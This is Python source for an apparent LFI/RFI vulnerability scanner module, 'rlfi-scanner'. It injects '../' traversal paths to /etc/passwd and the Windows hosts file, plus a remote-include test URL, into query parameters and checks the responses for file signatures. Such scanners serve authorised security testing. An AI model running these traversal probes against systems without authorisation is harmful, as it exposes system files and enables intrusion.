from __future__ import absolute_import

from arachne.base import Chooser, InObject
from arachne.browser import Browser
from arachne.celery import celery
from arachne.utils import celery_output, replace_params
from arachne.scripts.check_keyword import base_check_keyword
from arachne.scripts.scrape_headers import base_scrape_headers
from celery import group

name = 'rlfi-scanner'
def base_rlfi_init(link, browser_args, depth):
	if '?' not in link:
		return []
		
	nix_key = ('etc/passwd', 'root:x')
	win_key = ('windows/system32/drivers/etc/hosts', 'This is a sample HOSTS file')
	rem_key = ('https://raw.github.com/twisted/twisted/trunk/NEWS', 'Ticket numbers in this file can')

	nix_server = ('Ubuntu','Red Hat', 'CentOS', 'Unix', 'Debian', 'Linux','BSD')
	win_server = ('IIS', 'Microsoft', 'Win')

	server = base_scrape_headers(link, browser_args, ['server'])
	todo = [nix_key, win_key]
	if any(x in server for x in nix_server):
		todo = [nix_key]
	elif any(x in server for x in win_server):
		todo = [win_key]				

	to_input = [InObject(url, key=rem_key[1]) for url in replace_params(link, rem_key[0], False)]

	for d in xrange(1, depth+1):
		for inclusion, key in todo:
			path = '../' * d + inclusion
			to_input.extend([InObject(url, key=key) for url in replace_params(link, path, False)])

	return to_input

@celery.task(name='arachne.scripts.check_rlfi')
def test_rlfi(link, browser_args, job_name, out_name, key):
	out = base_check_keyword(link, browser_args, [key, 'No such file'])
	if out:
		celery_output.delay(out, name, job_name, out_name)

@celery.task(name='arachne.scripts.scan_rlfi')
def scan_rlfi(link, browser_args, job_name, out_name, depth):
	todo = base_rlfi_init(link, browser_args, depth)

	args = (browser_args, job_name, out_name)
	group(test_rlfi.subtask((url.item, ) + args + (url.key, ),
		**scan_rlfi.request.delivery_info) for url in todo)()

class BaseRlfiScanner( Chooser ):
	def __init__(self):
		desc = 'Scan for LFI and RFI vulnerabilities from list of URLs'
		super(BaseRlfiScanner, self).__init__(name, desc)
		self.subparser.add_argument('-d', '--depth', type=int, default=4,
			help='Number of directories to traverse for LFI')

	def init_async(self, cls, obj):
		obj.core = scan_rlfi
		obj.base_args += [
			obj.args.depth
		]

	def init_local(self, cls, obj):
		cls.rlfi_init = rlfi_init
		cls.rlfi_scan = rlfi_scan
		obj.phases = [obj.rlfi_init, obj.rlfi_scan]
		obj.in_object['key'] = ''

def rlfi_init(self, my_link):
	try:
		to_input = base_rlfi_init(my_link.item, self.browser_args, self.args.depth)
	except Exception as e:
		return self.error_catch('rlfi: checking server', my_link, e)		
	self.to_input.extend(to_input)

def rlfi_scan(self, my_link):
	try:
		match = base_check_keyword(my_link.item, self.browser_args, [my_link.key, 'No such file'])
	except Exception as e:
		return self.error_catch('rlfi: checking keyword', my_link, e)			
	if match:
		self.output.append(match)

def main():
	s = BaseRlfiScanner()
	s.start()

if __name__ == "__main__":
	main()